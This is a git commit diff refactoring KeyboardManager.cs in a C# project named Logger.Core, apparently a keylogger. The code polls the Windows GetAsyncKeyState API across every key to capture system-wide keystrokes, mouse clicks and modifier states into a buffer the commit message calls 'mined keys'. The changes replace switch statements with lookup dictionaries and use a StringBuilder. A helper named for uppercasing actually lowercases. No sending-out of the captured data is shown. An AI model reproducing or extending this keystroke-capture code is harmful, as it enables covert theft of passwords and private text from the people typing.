a859b5e7088775d94f7ff97fb1c98e64a4744f0f
Coderrob <Rob@coderrob.com>
2015-07-23 18:15:54 -0400

    (update)
    Moved the key lookup to dictionary values instead of switch statements.
    
    Added state toggle function for the function keys that are able to be turned on or off by user.
    
    Moved to using a string builder to buffer the mined keys from the keyboard manager instead of appending strings.

--- Logger.Core/KeyboardManager.cs
+++ Logger.Core/KeyboardManager.cs
@@ -1,6 +1,8 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Windows.Forms;
 
 namespace Logger.Core
@@ -11,12 +13,78 @@ namespace Logger.Core
         private static bool _ctrlOn;
         private static bool _capsLockOn;
 
+        private static readonly Dictionary<string, string> FunctionKeyLookup = new Dictionary<string, string>
+        {
+            {"LButton", "<LMouse>"},
+            {"RButton", "<RMouse>"},
+            {"Back", "<Backspace>"},
+            {"Space", " "},
+            {"Return", "<Enter>"},
+            {"Enter", "<Enter>"},
+            {"Delete", "<Del>"},
+            {"Insert", "<Ins>"},
+            {"Home", "<Home>"},
+            {"End", "<End>"},
+            {"Tab", "<Tab>"},
+            {"Prior", "<Page Up>"},
+            {"PageDown", "<Page Down>"},
+            {"RWin", "<Win>"},
+            {"LWin", "<Win>"}
+        };
+
+        private static readonly Dictionary<string, string> NumericKeyRowLookup = new Dictionary<string, string>
+        {
+            {"48", "0"},
+            {"49", "1"},
+            {"50", "2"},
+            {"51", "3"},
+            {"52", "4"},
+            {"53", "5"},
+            {"54", "6"},
+            {"55", "7"},
+            {"56", "8"},
+            {"57", "9"},
+            {"186", ";"},
+            {"187", "="},
+            {"188", ","},
+            {"189", "-"},
+            {"190", "."},
+            {"191", "/"},
+            {"192", "`"},
+            {"219", "["},
+            {"220", "\\"},
+            {"221", "]"},
+            {"222", "'"}
+        };
+
+        private static readonly Dictionary<string, string> SpecialKeyRowLookup = new Dictionary<string, string>
+        {
+            {"48", ")"},
+            {"49", "!"},
+            {"50", "@"},
+            {"51", "#"},
+            {"52", "$"},
+            {"53", "%"},
+            {"54", "^"},
+            {"55", "&"},
+            {"56", "*"},
+            {"57", "("},
+            {"186", ":"},
+            {"187", "+"},
+            {"188", "<"},
+            {"189", "_"},
+            {"190", ">"},
+            {"191", "?"},
+            {"192", "~"},
+            {"219", "{"},
+            {"220", "|"},
+            {"221", "}"},
+            {"222", "\""}
+        };
+
         private static bool ControlKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000);
-
         private static bool ShiftKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);
-
         private static bool CapsLock => Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000);
-
         private static bool AltKey => Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000);
 
         [DllImport("User32.dll")]
@@ -25,275 +93,72 @@ namespace Logger.Core
         [DllImport("User32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
+        private static bool UpdateKeyState(ref bool currentState, bool newState)
+        {
+            if (newState)
+            {
+                if (currentState) return false;
+
+                currentState = true;
+            }
+            else
+            {
+                if (!currentState) return false;
+
+                currentState = false;
+            }
+
+            return true;
+        }
+
         public static string GetKeys()
         {
-            var keyBuffer = string.Empty;
+            var keyBuffer = new StringBuilder(1024);
 
             try
             {
-                foreach (var i in from int i in Enum.GetValues(typeof (Keys)) where GetAsyncKeyState(i) == -32767 select i)
+                foreach (
+                    var i in from int i in Enum.GetValues(typeof (Keys)) where GetAsyncKeyState(i) == -32767 select i)
                 {
-                    if (ControlKey)
-                    {
-                        if (!_ctrlOn)
-                        {
-                            _ctrlOn = true;
-                            keyBuffer += "<Ctrl=On>";
-                        }
-                    }
-                    else
-                    {
-                        if (_ctrlOn)
-                        {
-                            _ctrlOn = false;
-                            keyBuffer += "<Ctrl=Off>";
-                        }
-                    }
+                    if (UpdateKeyState(ref _ctrlOn, ControlKey))
+                        keyBuffer.Append(_ctrlOn ? "<Ctrl=On>" : "<Ctrl=Off>");
 
-                    if (AltKey)
-                    {
-                        if (!_altOn)
-                        {
-                            _altOn = true;
-                            keyBuffer += "<Alt=On>";
-                        }
-                    }
-                    else
-                    {
-                        if (_altOn)
-                        {
-                            _altOn = false;
-                            keyBuffer += "<Alt=Off>";
-                        }
-                    }
+                    if (UpdateKeyState(ref _altOn, AltKey))
+                        keyBuffer.Append(_altOn ? "<Alt=On>" : "<Alt=Off>");
 
-                    if (CapsLock)
-                    {
-                        if (!_capsLockOn)
-                        {
-                            _capsLockOn = true;
-                            keyBuffer += "<CapsLock=On>";
-                        }
-                    }
-                    else
-                    {
-                        if (_capsLockOn)
-                        {
-                            _capsLockOn = false;
-                            keyBuffer += "<CapsLock=Off>";
-                        }
-                    }
+                    if (UpdateKeyState(ref _capsLockOn, CapsLock))
+                        keyBuffer.Append(_capsLockOn ? "<CapsLock=On>" : "<CapsLock=Off>");
 
                     var keyName = Enum.GetName(typeof (Keys), i);
 
-                    switch (keyName)
+                    if (keyName != null && FunctionKeyLookup.ContainsKey(keyName))
                     {
-                        case "LButton":
-                            keyBuffer += "<LMouse>";
-                            break;
-                        case "RButton":
-                            keyBuffer += "<RMouse>";
-                            break;
-                        case "Back":
-                            keyBuffer += "<Backspace>";
-                            break;
-                        case "Space":
-                            keyBuffer += " ";
-                            break;
-                        case "Return":
-                            keyBuffer += "<Enter>";
-                            break;
-                        case "ControlKey":
-                            continue;
-                        case "LControlKey":
-                            continue;
-                        case "RControlKey":
-                            continue;
-                        case "ShiftKey":
-                            continue;
-                        case "LShiftKey":
-                            continue;
-                        case "RShiftKey":
-                            continue;
-                        case "Delete":
-                            keyBuffer += "<Del>";
-                            break;
-                        case "Insert":
-                            keyBuffer += "<Ins>";
-                            break;
-                        case "Home":
-                            keyBuffer += "<Home>";
-                            break;
-                        case "End":
-                            keyBuffer += "<End>";
-                            break;
-                        case "Tab":
-                            keyBuffer += "<Tab>";
-                            break;
-                        case "Prior":
-                            keyBuffer += "<Page Up>";
-                            break;
-                        case "PageDown":
-                            keyBuffer += "<Page Down>";
-                            break;
-                        case "RWin":
-                        case "LWin":
-                            keyBuffer += "<Win>";
-                            break;
+                        keyBuffer.Append(FunctionKeyLookup[keyName]);
                     }
 
-                    /* ********************************************* *
-                    * Detect key based off ShiftKey Toggle
-                    * ********************************************** */
                     keyName = i.ToString();
 
                     if (ShiftKey)
                     {
-                        if (i >= 65 && i <= 122)
+                        if (IsAsciiCharacterValue(i))
                         {
-                            keyBuffer += (char) i;
+                            keyBuffer.Append((char) i);
                         }
-                        else
-                            switch (keyName)
-                            {
-                                case "49":
-                                    keyBuffer += "!";
-                                    break;
-                                case "50":
-                                    keyBuffer += "@";
-                                    break;
-                                case "51":
-                                    keyBuffer += "#";
-                                    break;
-                                case "52":
-                                    keyBuffer += "$";
-                                    break;
-                                case "53":
-                                    keyBuffer += "%";
-                                    break;
-                                case "54":
-                                    keyBuffer += "^";
-                                    break;
-                                case "55":
-                                    keyBuffer += "&";
-                                    break;
-                                case "56":
-                                    keyBuffer += "*";
-                                    break;
-                                case "57":
-                                    keyBuffer += "(";
-                                    break;
-                                case "48":
-                                    keyBuffer += ")";
-                                    break;
-                                case "192":
-                                    keyBuffer += "~";
-                                    break;
-                                case "189":
-                                    keyBuffer += "_";
-                                    break;
-                                case "187":
-                                    keyBuffer += "+";
-                                    break;
-                                case "219":
-                                    keyBuffer += "{";
-                                    break;
-                                case "221":
-                                    keyBuffer += "}";
-                                    break;
-                                case "220":
-                                    keyBuffer += "|";
-                                    break;
-                                case "186":
-                                    keyBuffer += ":";
-                                    break;
-                                case "222":
-                                    keyBuffer += "\"";
-                                    break;
-                                case "188":
-                                    keyBuffer += "<";
-                                    break;
-                                case "190":
-                                    keyBuffer += ">";
-                                    break;
-                                case "191":
-                                    keyBuffer += "?";
-                                    break;
-                            }
+                        else if (SpecialKeyRowLookup.ContainsKey(keyName))
+                        {
+                            keyBuffer.Append(SpecialKeyRowLookup[keyName]);
+                        }
                     }
                     else
                     {
-                        if (i >= 65 && i <= 122)
+                        if (IsAsciiCharacterValue(i))
                         {
-                            keyBuffer += (char) (i + 32);
+                            keyBuffer.Append(GetUppercaseAsciiCharacterValue(i));
                         }
-                        else
-                            switch (keyName)
-                            {
-                                case "49":
-                                    keyBuffer += "1";
-                                    break;
-                                case "50":
-                                    keyBuffer += "2";
-                                    break;
-                                case "51":
-                                    keyBuffer += "3";
-                                    break;
-                                case "52":
-                                    keyBuffer += "4";
-                                    break;
-                                case "53":
-                                    keyBuffer += "5";
-                                    break;
-                                case "54":
-                                    keyBuffer += "6";
-                                    break;
-                                case "55":
-                                    keyBuffer += "7";
-                                    break;
-                                case "56":
-                                    keyBuffer += "8";
-                                    break;
-                                case "57":
-                                    keyBuffer += "9";
-                                    break;
-                                case "48":
-                                    keyBuffer += "0";
-                                    break;
-                                case "189":
-                                    keyBuffer += "-";
-                                    break;
-                                case "187":
-                                    keyBuffer += "=";
-                                    break;
-                                case "92":
-                                    keyBuffer += "`";
-                                    break;
-                                case "219":
-                                    keyBuffer += "[";
-                                    break;
-                                case "221":
-                                    keyBuffer += "]";
-                                    break;
-                                case "220":
-                                    keyBuffer += "\\";
-                                    break;
-                                case "186":
-                                    keyBuffer += ";";
-                                    break;
-                                case "222":
-                                    keyBuffer += "'";
-                                    break;
-                                case "188":
-                                    keyBuffer += ",";
-                                    break;
-                                case "190":
-                                    keyBuffer += ".";
-                                    break;
-                                case "191":
-                                    keyBuffer += "/";
-                                    break;
-                            }
+                        else if (NumericKeyRowLookup.ContainsKey(keyName))
+                        {
+                            keyBuffer.Append(NumericKeyRowLookup[keyName]);
+                        }
                     }
                 }
             }
@@ -301,7 +166,17 @@ namespace Logger.Core
             {
             }
 
-            return keyBuffer;
+            return keyBuffer.ToString();
+        }
+
+        private static bool IsAsciiCharacterValue(int asciiValue)
+        {
+            return asciiValue >= 65 && asciiValue <= 122;
+        }
+
+        private static char GetUppercaseAsciiCharacterValue(int asciiValue)
+        {
+            return (char) (asciiValue + 32);
         }
     }
 }
